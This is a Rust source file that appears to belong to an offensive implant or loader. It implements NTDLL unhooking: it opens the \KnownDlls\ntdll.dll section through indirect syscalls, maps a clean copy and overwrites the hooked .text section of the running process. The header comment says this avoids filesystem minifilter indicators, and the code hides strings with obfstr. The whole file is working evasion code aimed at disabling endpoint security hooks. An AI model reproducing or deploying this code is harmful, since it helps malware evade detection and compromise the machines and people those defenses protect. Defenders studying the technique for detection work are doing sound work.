//! NTDLL unhooking via KnownDlls section object.
//!
//! Reads a clean ntdll from the \KnownDlls\ section (avoids filesystem minifilter
//! IOCs from CreateFile on ntdll.dll), maps it, overwrites the hooked .text section
//! in the process's copy, then unmaps the clean view.
//!
//! Feature-gated behind `unhook` (OFF by default).

use callghost::syscall;
use core::ffi::c_void;

const CURRENT_PROCESS: isize = -1;
const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
const SECTION_MAP_READ: u32 = 0x0004;
const OBJ_CASE_INSENSITIVE: u32 = 0x00000040;
const SEC_IMAGE: u32 = 0x01000000;
const VIEW_UNMAP: u32 = 0;

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *const u16,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: *mut c_void,
    object_name: *const UnicodeString,
    attributes: u32,
    security_descriptor: *mut c_void,
    security_quality_of_service: *mut c_void,
}

#[repr(C)]
#[allow(dead_code)]
struct ImageDosHeader {
    e_magic: u16,
    e_cblp: u16,
    e_cp: u16,
    e_crlc: u16,
    e_cparhdr: u16,
    e_minalloc: u16,
    e_maxalloc: u16,
    e_ss: u16,
    e_sp: u16,
    e_csum: u16,
    e_ip: u16,
    e_cs: u16,
    e_lfarlc: u16,
    e_ovno: u16,
    e_res: [u16; 4],
    e_oemid: u16,
    e_oeminfo: u16,
    e_res2: [u16; 10],
    e_lfanew: i32,
}

#[repr(C)]
#[allow(dead_code)]
struct ImageSectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    pointer_to_relocations: u32,
    pointer_to_linenumbers: u32,
    number_of_relocations: u16,
    number_of_linenumbers: u16,
    characteristics: u32,
}

pub unsafe fn unhook_ntdll() -> bool {
    let clean_base = match map_clean_ntdll() {
        Some(ptr) => ptr,
        None => {
            crate::dlog!("unhook: failed to map clean ntdll");
            return false;
        }
    };

    let hooked_base = get_ntdll_base();
    if hooked_base.is_null() {
        crate::dlog!("unhook: failed to get ntdll base from PEB");
        unmap_view(clean_base);
        return false;
    }

    let result = overwrite_text(hooked_base, clean_base);

    unmap_view(clean_base);

    if result {
        crate::dlog!("unhook: .text replaced successfully");
    } else {
        crate::dlog!("unhook: .text replacement failed");
    }

    result
}

unsafe fn map_clean_ntdll() -> Option<*mut u8> {
    let name_wide: Vec<u16> = obfstr::wide!("\\KnownDlls\\ntdll.dll")
        .iter()
        .copied()
        .collect();

    let us = UnicodeString {
        length: ((name_wide.len()) * 2) as u16,
        maximum_length: ((name_wide.len()) * 2) as u16,
        buffer: name_wide.as_ptr(),
    };

    let oa = ObjectAttributes {
        length: core::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: core::ptr::null_mut(),
        object_name: &us,
        attributes: OBJ_CASE_INSENSITIVE,
        security_descriptor: core::ptr::null_mut(),
        security_quality_of_service: core::ptr::null_mut(),
    };

    let mut section_handle: *mut c_void = core::ptr::null_mut();

    let status = syscall!(
        indirect,
        NtOpenSection,
        &mut section_handle,
        SECTION_MAP_READ,
        &oa
    );

    if status != 0 || section_handle.is_null() {
        crate::dlog!("unhook: NtOpenSection failed: 0x{:08X}", status);
        return None;
    }

    let mut view_base: *mut c_void = core::ptr::null_mut();
    let mut view_size: usize = 0;

    let status = syscall!(
        indirect,
        NtMapViewOfSection,
        section_handle,
        CURRENT_PROCESS,
        &mut view_base,
        0usize,
        0usize,
        core::ptr::null_mut::<u64>(),
        &mut view_size,
        VIEW_UNMAP,
        0u32,
        PAGE_EXECUTE_WRITECOPY
    );

    let _ = syscall!(indirect, NtClose, section_handle);

    if status != 0 || view_base.is_null() {
        crate::dlog!("unhook: NtMapViewOfSection failed: 0x{:08X}", status);
        return None;
    }

    Some(view_base as *mut u8)
}

unsafe fn unmap_view(base: *mut u8) {
    let mut addr = base as *mut c_void;
    let _ = syscall!(
        indirect,
        NtUnmapViewOfSection,
        CURRENT_PROCESS,
        addr
    );
}

unsafe fn get_ntdll_base() -> *const u8 {
    let peb: *const u8;
    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    if peb.is_null() {
        return core::ptr::null();
    }
    let ldr = *(peb.add(0x18) as *const *const u8);
    if ldr.is_null() {
        return core::ptr::null();
    }
    let list_head = ldr.add(0x20) as *const *const u8;
    let first_entry = *(list_head);
    if first_entry.is_null() {
        return core::ptr::null();
    }
    let second_entry = *(first_entry as *const *const u8);
    if second_entry.is_null() {
        return core::ptr::null();
    }
    *(second_entry.add(0x20) as *const *const u8)
}

unsafe fn overwrite_text(hooked_base: *const u8, clean_base: *const u8) -> bool {
    let hooked_text = match find_text_section(hooked_base, true) {
        Some(t) => t,
        None => {
            crate::dlog!("unhook: .text not found in hooked ntdll");
            return false;
        }
    };

    let clean_text = match find_text_section(clean_base, true) {
        Some(t) => t,
        None => {
            crate::dlog!("unhook: .text not found in clean ntdll");
            return false;
        }
    };

    let copy_size = hooked_text.1.min(clean_text.1);
    if copy_size == 0 {
        return false;
    }

    let mut old_protect: u32 = 0;
    let mut region_addr = hooked_text.0 as *mut c_void;
    let mut region_size = copy_size;

    let status = syscall!(
        indirect,
        NtProtectVirtualMemory,
        CURRENT_PROCESS,
        &mut region_addr,
        &mut region_size,
        PAGE_EXECUTE_WRITECOPY,
        &mut old_protect
    );

    if status != 0 {
        crate::dlog!("unhook: NtProtectVirtualMemory(RWC) failed: 0x{:08X}", status);
        return false;
    }

    core::ptr::copy_nonoverlapping(clean_text.0, hooked_text.0 as *mut u8, copy_size);

    region_addr = hooked_text.0 as *mut c_void;
    region_size = copy_size;

    let _ = syscall!(
        indirect,
        NtProtectVirtualMemory,
        CURRENT_PROCESS,
        &mut region_addr,
        &mut region_size,
        old_protect,
        &mut old_protect
    );

    true
}

unsafe fn find_text_section(base: *const u8, mapped: bool) -> Option<(*const u8, usize)> {
    let dos = &*(base as *const ImageDosHeader);
    if dos.e_magic != 0x5A4D {
        return None;
    }

    let nt_offset = dos.e_lfanew as usize;
    let sig = *(base.add(nt_offset) as *const u32);
    if sig != 0x00004550 {
        return None;
    }

    let file_header_offset = nt_offset + 4;
    let num_sections = *(base.add(file_header_offset + 2) as *const u16) as usize;
    let opt_header_size = *(base.add(file_header_offset + 16) as *const u16) as usize;
    let first_section = file_header_offset + 20 + opt_header_size;

    for i in 0..num_sections {
        let sh = &*(base.add(first_section + i * 40) as *const ImageSectionHeader);
        if &sh.name[..5] == b".text" {
            let offset = if mapped {
                sh.virtual_address as usize
            } else {
                sh.pointer_to_raw_data as usize
            };
            let size = if mapped {
                sh.virtual_size as usize
            } else {
                sh.size_of_raw_data as usize
            };
            return Some((base.add(offset), size));
        }
    }
    None
}
